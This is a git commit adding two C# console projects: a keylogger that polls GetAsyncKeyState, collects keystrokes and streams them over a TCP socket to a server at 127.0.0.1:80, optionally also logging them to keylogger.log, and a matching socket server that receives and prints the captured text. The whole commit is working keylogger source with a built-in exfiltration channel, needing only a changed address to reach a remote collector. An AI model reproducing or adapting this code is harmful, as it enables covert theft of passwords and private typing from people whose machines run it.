dc1b359a63c2934e31ac082bed66e4966563c4af
Artemon4ik <Artemon4ik@DESKTOP-2OT4K0Q>
2023-03-24 22:15:59 +0300

    Добавьте файлы проекта.

---
+++ ConsoleApp1/Program.cs
@@ -0,0 +1,114 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Net.Sockets;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace ConsoleApp1
+{
+    internal class Program
+    {
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
+        static void Main(string[] args)
+        {
+            string SaveLocation = "";
+            Console.WriteLine("Save the log to a file? 1.Yes, 2.No.");
+            SaveLocation = Console.ReadLine();
+            if(SaveLocation == "1")
+            {
+                Console.WriteLine("Where do you want to save the file? Enter the save path (Example: C:\\Users\\PC-User\\Desktop).");
+                SaveLocation = Console.ReadLine();
+                Console.WriteLine("OK, now an attempt will be made to connect to the server. Please wait...");
+                IPEndPoint serverPoint = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 80);
+                Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);
+                clientSocket.Connect(serverPoint);
+                if (clientSocket.Connected)
+                {
+                    Console.WriteLine("Connect!");
+                    Console.WriteLine("Recording is in progress...");
+                    string buf = "";
+                    while (true)
+                    {
+                        Thread.Sleep(100);
+                        for (int i = 0; i < 255; i++)
+                        {
+                            int state = GetAsyncKeyState(i);
+                            if (state != 0)
+                            {
+                                if (((Keys)i) == Keys.Space) { buf += " "; continue; }
+                                if (((Keys)i) == Keys.Enter) { buf += "\r\n"; continue; }
+                                if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;
+                                if (((Keys)i).ToString().Length == 1)
+                                {
+                                    buf += ((Keys)i).ToString();
+                                }
+                                if (buf.Length > 5)
+                                {
+                                    clientSocket.Send(Encoding.UTF8.GetBytes(buf));
+                                    File.AppendAllText(SaveLocation + "\\keylogger.log", buf);
+                                    buf = "";
+                                }
+                            }
+                        }
+                    }
+                }
+                else
+                {
+                    Console.WriteLine("The program could not establish a connection.");
+                    clientSocket.Close();
+                }
+
+            }
+            if (SaveLocation == "2")
+            {
+                Console.WriteLine("OK, now an attempt will be made to connect to the server. Please wait...");
+                IPEndPoint serverPoint = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 80);
+                Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);
+                clientSocket.Connect(serverPoint);
+                if (clientSocket.Connected)
+                {
+                    Console.WriteLine("Connect!");
+                    Console.WriteLine("Recording is in progress...");
+                    string buf = "";
+                    while (true)
+                    {
+                        Thread.Sleep(100);
+                        for (int i = 0; i < 255; i++)
+                        {
+                            int state = GetAsyncKeyState(i);
+                            if (state != 0)
+                            {
+                                if (((Keys)i) == Keys.Space) { buf += " "; continue; }
+                                if (((Keys)i) == Keys.Enter) { buf += "\r\n"; continue; }
+                                if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;
+                                if (((Keys)i).ToString().Length == 1)
+                                {
+                                    buf += ((Keys)i).ToString();
+                                }
+                                if (buf.Length > 5)
+                                {
+                                    clientSocket.Send(Encoding.UTF8.GetBytes(buf));
+                                    //File.AppendAllText(SaveLocation + "\\keylogger.log", buf);
+                                    buf = "";
+                                }
+                            }
+                        }
+                    }
+                }
+                else
+                {
+                    Console.WriteLine("The program could not establish a connection.");
+                    clientSocket.Close();
+                }
+
+            }
+        }
+    }
+}
---
+++ Server/Program.cs
@@ -0,0 +1,82 @@
+﻿using System;
+using System.Text;
+using System.Net;
+using System.Net.Sockets;
+class Program
+{
+    static void Main()
+    {
+        try
+        {
+            IPEndPoint serverPoint = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 80);
+            Socket serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);
+            serverSocket.Bind(serverPoint);
+            serverSocket.Listen(1000);
+            serverSocket.BeginAccept(AcceptConnectionCallback, serverSocket);
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine(ex.Message);
+        }
+        Console.ReadLine();
+    }
+
+    static void AcceptConnectionCallback(IAsyncResult result)
+    {
+        if (result.AsyncState != null)
+        {
+            byte[] data = new byte[1024];
+            Socket server = (Socket)result.AsyncState;
+            Socket client = server.EndAccept(result);
+            Console.WriteLine($"Connection has occurred: {client.RemoteEndPoint} in {DateTime.Now}");
+            client.BeginReceive(data, 0, data.Length, SocketFlags.None, ClientReciveMessageCallback, new ClientMessage(client, data));
+            server.BeginAccept(AcceptConnectionCallback, server);
+        }
+    }
+
+    static void ClientReciveMessageCallback(IAsyncResult result)
+    {
+        if (result.AsyncState != null)
+        {
+            ClientMessage clientMessage = (ClientMessage)result.AsyncState;
+            Socket client = clientMessage.GetClient();
+            byte[] data = clientMessage.GetData();
+            client.EndReceive(result);
+            if (data[0] > 0)
+            {
+                string message = Encoding.UTF8.GetString(data);
+                if(message != "<Decimal><Decimal>")
+                Console.WriteLine(message);
+            }
+            client.BeginReceive(data, 0, data.Length, SocketFlags.None, ClientReciveMessageCallback, new ClientMessage(client, data));
+        }
+    }
+
+    static void ClientSendMessageCallback(IAsyncResult result)
+    {
+        if (result.AsyncState != null)
+        {
+            Socket client = (Socket)result.AsyncState;
+            client.EndSend(result);
+        }
+    }
+}
+
+class ClientMessage
+{
+    Socket _client;
+    byte[] _message = new byte[1024];
+    public ClientMessage(Socket client, byte[] message)
+    {
+        _client = client;
+        _message = message;
+    }
+    public Socket GetClient()
+    {
+        return _client;
+    }
+    public byte[] GetData()
+    {
+        return _message;
+    }
+}
